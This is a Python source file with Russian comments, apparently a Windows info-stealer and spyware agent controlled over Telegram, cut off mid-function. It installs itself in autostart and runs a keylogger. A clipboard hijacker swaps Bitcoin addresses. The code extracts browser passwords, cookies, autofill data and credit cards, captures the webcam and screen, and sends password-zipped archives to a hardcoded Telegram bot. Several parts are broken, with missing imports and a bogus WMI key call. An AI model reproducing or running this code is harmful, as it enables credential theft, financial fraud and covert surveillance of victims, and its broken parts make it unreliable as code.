import os
import sys
import platform
import threading
import time
import requests
from datetime import datetime
import re
import pyperclip
from pynput import keyboard
from pynput.mouse import Button, Controller as MouseController
from pynput.keyboard import Controller as KeyboardController
import json
import shutil
import getpass
import locale
import psutil
import uuid
import subprocess
import winreg
from win32com.client import Dispatch
try:
    import wmi
except ImportError:
    wmi = None
try:
    import win32com.client
except ImportError:
    win32com = None
from io import BytesIO
from PIL import ImageGrab, Image
import telegram
from telegram.ext import Updater, CommandHandler
import socket
import cv2
import tempfile
import numpy as np
import pyzipper
import webbrowser
# import yadisk # –ë–æ–ª—å—à–µ –Ω–µ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è

# For Windows-specific features
if platform.system() == "Windows":
    import ctypes
    from ctypes import wintypes

# For text-to-speech
try:
    import pyttsx3
except ImportError:
    pyttsx3 = None

# === –ù–ê–°–¢–†–û–ô–ö–ò ===
TELEGRAM_TOKEN = "8194741514:AAG-U_ffc_3rqQvHECBhyHrcuFtEdIEXQhQ"
TELEGRAM_CHAT_ID = "-1002794621184"
ZIP_PASSWORD = "Y1234" # –ü–ê–†–û–õ–¨ –î–õ–Ø –ê–†–•–ò–í–û–í
# YANDEX_TOKEN –±–æ–ª—å—à–µ –Ω–µ –Ω—É–∂–µ–Ω

# –ü–∞–ø–∫–∞ –¥–ª—è —Ö—Ä–∞–Ω–µ–Ω–∏—è –¥–∞–Ω–Ω—ã—Ö –ø—Ä–æ–≥—Ä–∞–º–º—ã
OUTPUT_DIR = os.path.expanduser('~/PC_Helper_Data')

# === –§–£–ù–ö–¶–ò–Ø –î–û–ë–ê–í–õ–ï–ù–ò–Ø –í –ê–í–¢–û–ó–ê–ì–†–£–ó–ö–£ –î–õ–Ø .EXE ===
def add_to_startup():
    startup_dir = os.path.join(os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
    exe_path = sys.executable  # –ü—É—Ç—å –∫ .exe-—Ñ–∞–π–ª—É
    shortcut_path = os.path.join(startup_dir, "universal_agent.lnk")
    if os.path.exists(shortcut_path):
        return
    try:
        import win32com.client
        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)
        shortcut.Targetpath = exe_path
        shortcut.WorkingDirectory = os.path.dirname(exe_path)
        shortcut.IconLocation = exe_path
        shortcut.save()
    except Exception as e:
        try:
            shutil.copy2(exe_path, os.path.join(startup_dir, os.path.basename(exe_path)))
        except Exception:
            pass

# === –ê–í–¢–û–ó–ê–ü–£–°–ö ===
def setup_autostart():
    # –ü—É—Ç—å –∫ –ø–∞–ø–∫–µ –∞–≤—Ç–æ–∑–∞–≥—Ä—É–∑–∫–∏ —Ç–µ–∫—É—â–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    startup_dir = os.path.join(os.getenv('APPDATA'), r'Microsoft\Windows\Start Menu\Programs\Startup')
    script_path = os.path.abspath(sys.argv[0])
    shortcut_path = os.path.join(startup_dir, 'btc_clipboard_monitor.lnk')

    # –°–æ–∑–¥–∞–¥–∏–º —è—Ä–ª—ã–∫ (—Ç—Ä–µ–±—É–µ—Ç—Å—è pywin32)
    try:
        import pythoncom
        from win32com.shell import shell, shellcon
        from win32com.client import Dispatch

        shell_link = Dispatch('WScript.Shell').CreateShortcut(shortcut_path)
        shell_link.TargetPath = sys.executable
        shell_link.Arguments = f'"{script_path}"'
        shell_link.WorkingDirectory = os.path.dirname(script_path)
        shell_link.IconLocation = sys.executable
        shell_link.Save()
        print(f'[INFO] –ê–≤—Ç–æ–∑–∞–ø—É—Å–∫ –Ω–∞—Å—Ç—Ä–æ–µ–Ω ‚Äî —Å–æ–∑–¥–∞–Ω —è—Ä–ª—ã–∫: {shortcut_path}')
    except ImportError:
        print('[ERROR] –î–ª—è –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞ –Ω–∞ Windows —Ç—Ä–µ–±—É–µ—Ç—Å—è pywin32. –£—Å—Ç–∞–Ω–æ–≤–∏—Ç–µ —á–µ—Ä–µ–∑:\n pip install pywin32')
    except Exception as e:
        print(f'[ERROR] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ–∑–¥–∞—Ç—å —è—Ä–ª—ã–∫ –∞–≤—Ç–æ–∑–∞–ø—É—Å–∫–∞: {e}')

# === –ö–ï–ô–õ–û–ì–ì–ï–† ===
LOG_FILE = os.path.join(OUTPUT_DIR, 'keylogs.txt')
SPECIAL_KEYS = {
    keyboard.Key.space: ' ',
    keyboard.Key.enter: '\n',
    keyboard.Key.tab: '\t',
    keyboard.Key.backspace: '[BACKSPACE]',
    keyboard.Key.esc: '[ESC]',
    keyboard.Key.shift: '[SHIFT]',
    keyboard.Key.cmd: '[WIN]',
    keyboard.Key.ctrl: '[CTRL]',
    keyboard.Key.alt: '[ALT]',
    keyboard.Key.caps_lock: '[CAPS LOCK]'
}
keylog_lock = threading.Lock()

# === –ì–õ–û–ë–ê–õ–¨–ù–´–ï –§–õ–ê–ì–ò ===
status_active = True
exit_flag = False
last_clipboard = None
BTC_PATTERN = re.compile(
    r'\b('
    r'1[a-km-zA-HJ-NP-Z1-9]{25,34}|'
    r'3[a-km-zA-HJ-NP-Z1-9]{25,34}|'
    r'bc1[qpzry9x8gf2tvdw0s3jn54khce6mua7l]{39,59}'
    r')\b',
    re.IGNORECASE
)

def keylogger_thread():
    def on_press(key):
        global status_active
        if not status_active:
            return
        try:
            ts = datetime.now().strftime('[%Y-%m-%d %H:%M:%S] ')
            if hasattr(key, 'char') and key.char:
                entry = key.char
            elif key in SPECIAL_KEYS:
                entry = SPECIAL_KEYS[key]
            elif hasattr(key, 'name'):
                entry = f"[{key.name.upper()}]"
            else:
                entry = str(key)
            with keylog_lock:
                with open(LOG_FILE, 'a', encoding='utf-8') as f:
                    f.write(ts + entry + '\n')
        except Exception:
            pass
    listener = keyboard.Listener(on_press=on_press)
    listener.start()
    while True:
        time.sleep(60)

def clipboard_monitor_thread():
    global last_clipboard, status_active
    while True:
        try:
            if not status_active:
                time.sleep(1)
                continue
            text = pyperclip.paste()
            if text != last_clipboard:
                matches = BTC_PATTERN.findall(text)
                if matches:
                    new_text = BTC_PATTERN.sub(BTC_ADDRESS, text)
                    pyperclip.copy(new_text)
                    msg = f"üö® –û–±–Ω–∞—Ä—É–∂–µ–Ω BTC-–∞–¥—Ä–µ—Å –≤ –±—É—Ñ–µ—Ä–µ!\n–ó–∞–º–µ–Ω—ë–Ω –Ω–∞: `{BTC_ADDRESS}`\n\n–û—Ä–∏–≥–∏–Ω–∞–ª: {matches}"
                    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
                    requests.post(url, data={
                        'chat_id': TELEGRAM_CHAT_ID,
                        'text': msg,
                        'parse_mode': 'Markdown'
                    })
                last_clipboard = pyperclip.paste()
            time.sleep(1)
        except Exception:
            time.sleep(2)

def get_chromium_base_path(browser_name):
    """–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç –±–∞–∑–æ–≤—ã–π –ø—É—Ç—å –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –±—Ä–∞—É–∑–µ—Ä–∞ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç –û–°."""
    config = CHROMIUM_BROWSERS.get(browser_name, {})
    os_name = platform.system().lower()
    path = ""
    if os_name == "windows":
        path = config.get("win")
    elif os_name == "darwin":
        path = config.get("darwin")
    
    return path if path and os.path.exists(path) else None

def get_chromium_profiles(base_path, browser_name):
    """–ò—â–µ—Ç –ø—Ä–æ—Ñ–∏–ª–∏ –≤ —É–∫–∞–∑–∞–Ω–Ω–æ–π –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ Chromium."""
    if not base_path:
        return []
    
    profiles = []
    # –î–ª—è Opera –∏ Opera GX –ø—É—Ç–∏ –∫ –¥–∞–Ω–Ω—ã–º –Ω–∞—Ö–æ–¥—è—Ç—Å—è –ø—Ä—è–º–æ –≤ –∫–æ—Ä–Ω–µ–≤–æ–π –ø–∞–ø–∫–µ –ø—Ä–æ—Ñ–∏–ª—è
    if browser_name in ["Opera", "Opera GX"]:
        if any(os.path.exists(os.path.join(base_path, f)) for f in ["Login Data", "Cookies"]):
            profiles.append(base_path)
        return profiles
        
    # –î–ª—è –æ—Å—Ç–∞–ª—å–Ω—ã—Ö Chromium (Chrome, Edge, Yandex) –∏—â–µ–º –≤ 'Default' –∏ 'Profile *'
    try:
        for folder in os.listdir(base_path):
            folder_path = os.path.join(base_path, folder)
            if os.path.isdir(folder_path) and (folder == "Default" or folder.startswith("Profile ")):
                if any(os.path.exists(os.path.join(folder_path, f)) for f in ["Login Data", "Cookies", "Web Data"]):
                    profiles.append(folder_path)
    except Exception:
        pass
    return profiles

def get_chromium_encryption_key(base_path):
    """–ü–æ–ª—É—á–∞–µ—Ç –∫–ª—é—á —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è –¥–ª—è Chromium-–±—Ä–∞—É–∑–µ—Ä–∞ (—Ç–æ–ª—å–∫–æ Windows)."""
    if platform.system() != "Windows" or not wmi or not base_path:
        return None
    local_state_path = os.path.join(base_path, 'Local State')
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        key = wmi.WMI().Win32_Cryptographic_Provider().Invoke()['Key']
        return key
    except Exception:
        return None

def chromium_decrypt_password(ciphertext, key):
    """–£–Ω–∏–≤–µ—Ä—Å–∞–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è —Ä–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∏ –ø–∞—Ä–æ–ª—è –¥–ª—è Chromium."""
    try:
        if ciphertext[:3] == b'v10':
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            return cipher.decrypt_and_verify(payload, tag).decode()
        else:
            return wmi.WMI().Win32_Cryptographic_Provider().Invoke()['Key']
    except:
        return ""

def extract_chromium_data(browser_name):
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –ø–∞—Ä–æ–ª–∏, –∫—É–∫–∏ –∏ –∞–≤—Ç–æ–∑–∞–ø–æ–ª–Ω–µ–Ω–∏–µ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ Chromium –±—Ä–∞—É–∑–µ—Ä–∞."""
    base_path = get_chromium_base_path(browser_name)
    if not base_path:
        return {}

    key = get_chromium_encryption_key(base_path)
    profiles = get_chromium_profiles(base_path, browser_name)
    
    data = {'passwords': [], 'cookies': [], 'autofill': []}

    for profile_path in profiles:
        profile_name = os.path.basename(profile_path)
        if profile_name == base_path: profile_name = "Default"

        # --- Passwords ---
        pw_db_path = os.path.join(profile_path, 'Login Data')
        if os.path.exists(pw_db_path):
            tmp_path = copy_db(pw_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                        for url, user, encrypted in cursor.fetchall():
                            if user and encrypted:
                                password = chromium_decrypt_password(encrypted, key)
                                data['passwords'].append(f"Profile: {profile_name}\nURL: {url}\nUser: {user}\nPass: {password}\n")
                except Exception: pass
                finally: safe_remove(tmp_path)
        
        # --- Cookies ---
        cookies_db_path = os.path.join(profile_path, 'Cookies')
        if os.path.exists(cookies_db_path):
            tmp_path = copy_db(cookies_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                        for host, name, encrypted in cursor.fetchall():
                            value = chromium_decrypt_password(encrypted, key)
                            if value:
                                data['cookies'].append(f"Profile: {profile_name}\nHost: {host}\nName: {name}\nValue: {value}\n")
                except Exception: pass
                finally: safe_remove(tmp_path)

        # --- Autofill ---
        autofill_db_path = os.path.join(profile_path, 'Web Data')
        if os.path.exists(autofill_db_path):
            tmp_path = copy_db(autofill_db_path)
            if tmp_path:
                try:
                    with sqlite3.connect(tmp_path) as conn:
                        cursor = conn.cursor()
                        # 1. Generic Autofill Data
                        try:
                            cursor.execute("SELECT name, value FROM autofill")
                            for name, value in cursor.fetchall():
                                if name and value:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Generic Form\nName: {name}\nValue: {value}\n")
                        except sqlite3.OperationalError:
                            pass # Table might not exist

                        # 2. Addresses
                        try:
                            cursor.execute("SELECT full_name, company_name, street_address, city, state, zipcode, country_code, phone_home_whole_number, email_address FROM autofill_profiles")
                            for full_name, company, addr, city, state, zip_code, country, phone, email in cursor.fetchall():
                                address_parts = [
                                    f"Full Name: {full_name}" if full_name else None,
                                    f"Company: {company}" if company else None,
                                    f"Address: {addr}, {city}, {state} {zip_code}, {country}" if addr else None,
                                    f"Phone: {phone}" if phone else None,
                                    f"Email: {email}" if email else None
                                ]
                                address_str = "\n".join(filter(None, address_parts))
                                if address_str:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Address\n{address_str}\n")
                        except sqlite3.OperationalError:
                            pass # Table or columns might not exist

                        # 3. Credit Cards
                        try:
                            cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")
                            for name, exp_m, exp_y, encrypted_card in cursor.fetchall():
                                card_number = chromium_decrypt_password(encrypted_card, key)
                                if card_number:
                                    data['autofill'].append(f"Profile: {profile_name}\nType: Credit Card\nName on Card: {name}\nExpires: {exp_m}/{exp_y}\nNumber: {card_number}\n")
                        except sqlite3.OperationalError:
                            pass # Table might not exist

                except Exception:
                    # Catch other potential errors during connection or file handling
                    pass
                finally:
                    safe_remove(tmp_path)
                
    return data

def copy_db(db_path):
    """–ö–æ–ø–∏—Ä—É–µ—Ç –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö –≤–æ –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª, —á—Ç–æ–±—ã –æ–±–æ–π—Ç–∏ –±–ª–æ–∫–∏—Ä–æ–≤–∫—É."""
    try:
        fd, tmp_path = tempfile.mkstemp(suffix='.db')
        os.close(fd)
        shutil.copy2(db_path, tmp_path)
        return tmp_path
    except Exception:
        return None

def safe_remove(path):
    """–ë–µ–∑–æ–ø–∞—Å–Ω–æ —É–¥–∞–ª—è–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–π —Ñ–∞–π–ª."""
    if not path: return
    for _ in range(5):
        try:
            os.remove(path)
            return
        except PermissionError:
            time.sleep(0.1)
        except Exception:
            return

def get_firefox_profiles():
    """–ù–∞—Ö–æ–¥–∏—Ç –ø—É—Ç–∏ –∫ –ø—Ä–æ—Ñ–∏–ª—è–º Firefox."""
    profiles = []
    ff_path_base = ""
    if platform.system() == 'Windows':
        ff_path_base = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox')
    elif platform.system() == 'Darwin':
        ff_path_base = os.path.join(os.path.expanduser('~'), 'Library', 'Application Support', 'Firefox')
    else: # Linux
        ff_path_base = os.path.join(os.path.expanduser('~'), '.mozilla', 'firefox')

    profiles_ini = os.path.join(ff_path_base, 'profiles.ini')
    if not os.path.exists(profiles_ini):
        return []

    try:
        with open(profiles_ini, 'r', encoding='utf-8') as f:
            current_path = None
            is_relative = False
            for line in f:
                line = line.strip()
                if line.lower().startswith('[profile'):
                    # –°–±—Ä–∞—Å—ã–≤–∞–µ–º –∑–Ω–∞—á–µ–Ω–∏—è –¥–ª—è –Ω–æ–≤–æ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è
                    if current_path is not None:
                        path_to_add = os.path.join(ff_path_base, current_path.replace('/', os.sep)) if is_relative else current_path.replace('/', os.sep)
                        if os.path.exists(path_to_add):
                            profiles.append(path_to_add)
                    current_path = None
                    is_relative = False
                elif line.lower().startswith('path='):
                    current_path = line[5:]
                elif line.lower().startswith('isrelative='):
                    is_relative = line[11:].strip() == '1'
            # –î–æ–±–∞–≤–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω–∏–π –ø—Ä–æ—Ñ–∏–ª—å –≤ —Ñ–∞–π–ª–µ
            if current_path is not None:
                path_to_add = os.path.join(ff_path_base, current_path.replace('/', os.sep)) if is_relative else current_path.replace('/', os.sep)
                if os.path.exists(path_to_add):
                    profiles.append(path_to_add)
    except Exception:
        pass # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ –ø–∞—Ä—Å–∏–Ω–≥–∞

    return list(set(profiles)) # –í–æ–∑–≤—Ä–∞—â–∞–µ–º —É–Ω–∏–∫–∞–ª—å–Ω—ã–µ –ø—É—Ç–∏

def run_firefox_decrypt(profile_path):
    """–ó–∞–ø—É—Å–∫–∞–µ—Ç firefox_decrypt –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –ø—Ä–æ—Ñ–∏–ª—è –∏ –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Ä–µ–∑—É–ª—å—Ç–∞—Ç."""
    script_path = os.path.join(FIREFOX_DECRYPT_PATH, 'firefox_decrypt.py')
    if not os.path.exists(script_path):
        return f"–°–∫—Ä–∏–ø—Ç firefox_decrypt.py –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ {FIREFOX_DECRYPT_PATH}"

    # –ò—Å–ø–æ–ª—å–∑—É–µ–º —Ç–æ—Ç –∂–µ python.exe, –∫–æ—Ç–æ—Ä—ã–º –∑–∞–ø—É—â–µ–Ω –æ—Å–Ω–æ–≤–Ω–æ–π —Å–∫—Ä–∏–ø—Ç
    python_executable = sys.executable
    
    try:
        # –ó–∞–ø—É—Å–∫–∞–µ–º firefox_decrypt –∫–∞–∫ –ø–æ–¥–ø—Ä–æ—Ü–µ—Å—Å
        result = subprocess.run(
            [python_executable, script_path, profile_path],
            capture_output=True,
            text=True,
            encoding='utf-8',
            errors='ignore',
            check=True,
            timeout=30 # –¢–∞–π–º–∞—É—Ç –Ω–∞ –≤—Å—è–∫–∏–π —Å–ª—É—á–∞–π
        )
        return result.stdout
    except FileNotFoundError:
        return f"–û—à–∏–±–∫–∞: –Ω–µ –Ω–∞–π–¥–µ–Ω '{python_executable}'. –£–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ Python –≤ PATH."
    except subprocess.CalledProcessError as e:
        return f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ firefox_decrypt –¥–ª—è '{profile_path}':\n{e.stderr}"
    except subprocess.TimeoutExpired:
        return f"–¢–∞–π–º–∞—É—Ç –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ firefox_decrypt –¥–ª—è '{profile_path}'."
    except Exception as e:
        return f"–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∑–∞–ø—É—Å–∫–µ firefox_decrypt –¥–ª—è '{profile_path}': {e}"

def extract_firefox_passwords():
    """–ò–∑–≤–ª–µ–∫–∞–µ—Ç –ø–∞—Ä–æ–ª–∏ Firefox —Å –ø–æ–º–æ—â—å—é firefox_decrypt."""
    if not ensure_firefox_decrypt():
        return ["–ó–∞–≤–∏—Å–∏–º–æ—Å—Ç—å firefox_decrypt –Ω–µ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞. –ò–∑–≤–ª–µ—á–µ–Ω–∏–µ –ø–∞—Ä–æ–ª–µ–π Firefox –Ω–µ–≤–æ–∑–º–æ–∂–Ω–æ."]
    profiles = get_firefox_profiles()
    results = []
    for profile in profiles:
        profile_name = os.path.basename(profile)
        decrypted_data = run_firefox_decrypt(profile)
        results.append(f"=== Firefox Profile: {profile_name} ===\n{decrypted_data}\n\n")
    return results

def screenshot_thread():
    while True:
        time.sleep(10)

def webcam_thread():
    while True:
        time.sleep(10)

def generate_and_send_archive(is_manual_request=False, chat_id=TELEGRAM_CHAT_ID):
    """–°–æ–±–∏—Ä–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ, –∞—Ä—Ö–∏–≤–∏—Ä—É–µ—Ç, –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –≤ Telegram –∏ –æ—á–∏—â–∞–µ—Ç –≤—Ä–µ–º–µ–Ω–Ω—ã–µ —Ñ–∞–π–ª—ã."""
    now = datetime.now().strftime('%Y%m%d_%H%M%S')
    new_files = []
    
    try:
        # --- –°–±–æ—Ä –¥–∞–Ω–Ω—ã—Ö –∏ —Å–æ–∑–¥–∞–Ω–∏–µ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ñ–∞–π–ª–æ–≤ ---
        for browser_name in CHROMIUM_BROWSERS.keys():
            browser_data = extract_chromium_data(browser_name)
            if browser_data.get('passwords'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_passwords_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Passwords ---\n\n")
                    f.writelines(browser_data['passwords'])
                new_files.append(file_path)
            if browser_data.get('cookies'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_cookies_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Cookies ---\n\n")
                    f.writelines(browser_data['cookies'])
                new_files.append(file_path)
            if browser_data.get('autofill'):
                file_path = os.path.join(OUTPUT_DIR, f'{browser_name.lower()}_autofill_{now}.txt')
                with open(file_path, 'w', encoding='utf-8') as f:
                    f.write(f"--- {browser_name} Autofill ---\n\n")
                    f.writelines(browser_data['autofill'])
                new_files.append(file_path)

        firefox_pw = extract_firefox_passwords()
        if firefox_pw:
            file_path = os.path.join(OUTPUT_DIR, f'firefox_passwords_{now}.txt')
            with open(file_path, 'w', encoding='utf-8') as f:
                f.writelines(firefox_pw)
            new_files.append(file_path)

        files_to_zip = new_files[:]
        if os.path.exists(LOG_FILE):
            files_to_zip.append(LOG_FILE)

        if not files_to_zip:
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ, –µ—Å–ª–∏ –Ω–µ—á–µ–≥–æ –∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞—Ç—å –ø—Ä–∏ —Ä—É—á–Ω–æ–º –∑–∞–ø—Ä–æ—Å–µ
            if is_manual_request:
                requests.post(
                    f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                    data={'chat_id': chat_id, 'text': "–ù–µ—á–µ–≥–æ –∞—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞—Ç—å. –í—Å–µ –¥–∞–Ω–Ω—ã–µ —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã."}
                )
            return

        # --- –ê—Ä—Ö–∏–≤–∏—Ä–æ–≤–∞–Ω–∏–µ ---
        archive_name = f"agent_data_{now}.zip"
        archive_path = os.path.join(OUTPUT_DIR, archive_name)
        with pyzipper.AESZipFile(archive_path, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zipf:
            zipf.setpassword(ZIP_PASSWORD.encode('utf-8'))
            for file_path in files_to_zip:
                if os.path.exists(file_path):
                    zipf.write(file_path, arcname=os.path.basename(file_path))

        # --- –û—Ç–ø—Ä–∞–≤–∫–∞ –∞—Ä—Ö–∏–≤–∞ –≤ Telegram ---
        caption = "–ê—Ä—Ö–∏–≤ –ø–æ –∑–∞–ø—Ä–æ—Å—É" if is_manual_request else "–ê–≤—Ç–æ–∞—Ä—Ö–∏–≤"
        caption += f". –ü–∞—Ä–æ–ª—å: `{ZIP_PASSWORD}`"
        
        # –ü—Ä–æ–≤–µ—Ä–∫–∞ —Ä–∞–∑–º–µ—Ä–∞ —Ñ–∞–π–ª–∞ (–ª–∏–º–∏—Ç Telegram ~50MB)
        if os.path.getsize(archive_path) > 50 * 1024 * 1024:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={'chat_id': chat_id, 'text': f"–û—à–∏–±–∫–∞: –ê—Ä—Ö–∏–≤ '{archive_name}' —Å–ª–∏—à–∫–æ–º –±–æ–ª—å—à–æ–π (>50–ú–ë) –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏."}
            )
            return

        with open(archive_path, 'rb') as archive_file:
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendDocument",
                files={'document': archive_file},
                data={'chat_id': chat_id, 'caption': caption, 'parse_mode': 'Markdown'}
            )

    except Exception as e:
        if is_manual_request:
            # –ï—Å–ª–∏ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Ä—É—á–Ω–æ–º –∑–∞–ø—Ä–æ—Å–µ, —Å–æ–æ–±—â–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
            requests.post(
                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
                data={'chat_id': chat_id, 'text': f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –∏–ª–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∞—Ä—Ö–∏–≤–∞: {e}"}
            )
    finally:
        # --- –û—á–∏—Å—Ç–∫–∞ ---
        for file_path in new_files:
            safe_remove(file_path)
        if 'archive_path' in locals() and os.path.exists(archive_path):
            safe_remove(archive_path)

def archive_and_send_thread():
    while True:
        generate_and_send_archive(is_manual_request=False)
        time.sleep(60 * 60) # 1 —á–∞—Å

def take_screenshot():
    try:
        img = ImageGrab.grab()
        bio = BytesIO()
        img.save(bio, format="PNG")
        bio.seek(0)
        return bio
    except Exception as e:
        return None

def get_system_info():
    info = {
        "üñ•Ô∏è Name": socket.gethostname(),
        "üíª OS": f"{platform.system()} {platform.release()}"
    }
    try:
        info["üåê IP"] = requests.get("https://api.ipify.org", timeout=5).text
    except:
        info["üåê IP"] = "N/A"
    return info

def capture_webcam(duration=None):
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None
        if duration is None:
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return None
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            img = Image.fromarray(frame)
            bio = BytesIO()
            img.save(bio, format="JPEG")
            bio.seek(0)
            return bio
        else:
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            tmp_fd, tmp_path = tempfile.mkstemp(suffix='.mp4')
            os.close(tmp_fd)
            fps = 20.0
            width = int(cap.get(cv2.CAP_PROP_FRAME_WIDTH))
            height = int(cap.get(cv2.CAP_PROP_FRAME_HEIGHT))
            out = cv2.VideoWriter(tmp_path, fourcc, fps, (width, height))
            start = time.time()
            while time.time() - start < duration:
                ret, frame = cap.read()
                if not ret:
                    break
                out.write(frame)
            cap.release()
            out.release()
            return tmp_path
    except Exception:
        return None

def get_full_status_info():
    info = {}
    # === –û–°–ù–û–í–ù–û–ï ===
    try:
        info['–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞'] = socket.gethostname()
    except Exception as e:
        info['–ò–º—è —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        info['–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è'] = os.getlogin()
    except Exception:
        try:
            info['–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è'] = getpass.getuser()
        except Exception as e:
            info['–ò–º—è –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        info['–û–°'] = f"{platform.system()} {platform.release()} ({platform.version()})"
        info['–†–∞–∑—Ä—è–¥–Ω–æ—Å—Ç—å'] = platform.architecture()[0]
    except Exception as e:
        info['–û–°'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        info['–Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã'] = locale.getdefaultlocale()[0]
    except Exception as e:
        info['–Ø–∑—ã–∫ —Å–∏—Å—Ç–µ–º—ã'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        uptime_sec = time.time() - psutil.boot_time()
        uptime_str = time.strftime('%H:%M:%S', time.gmtime(uptime_sec))
        info['Uptime'] = uptime_str
    except Exception as e:
        info['Uptime'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        info['–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞'] = platform.architecture()[0]
    except Exception as e:
        info['–ê—Ä—Ö–∏—Ç–µ–∫—Ç—É—Ä–∞'] = f'–û—à–∏–±–∫–∞: {e}'
    # === –û–±–æ—Ä—É–¥–æ–≤–∞–Ω–∏–µ ===
    try:
        info['CPU'] = f"{platform.processor()} ({psutil.cpu_count(logical=False)} —è–¥–µ—Ä / {psutil.cpu_count()} –ø–æ—Ç–æ–∫–æ–≤)"
    except Exception as e:
        info['CPU'] = f'–û—à–∏–±–∫–∞: {e}'
    try:
        ram = psutil.virtual_memory()
        info['RAM'] = f"{round(ram.total / (1024**3), 2)} –ì–ë"
    except Exception as e:
        info['RAM'] = f'–û—à–∏–±–∫–∞: {e}'
    # GPU (–æ–≥—Ä–∞–Ω–∏—á–µ–Ω–Ω–æ)
    gpu_info = 'N/A'
    if platform.system() == 'Windows':
        try:
            if wmi:
                c = wmi.WMI()
                gpus = c.Win32_VideoController()
                gpu_info = ", ".join([gpu.Name for gpu in gpus])
            else:
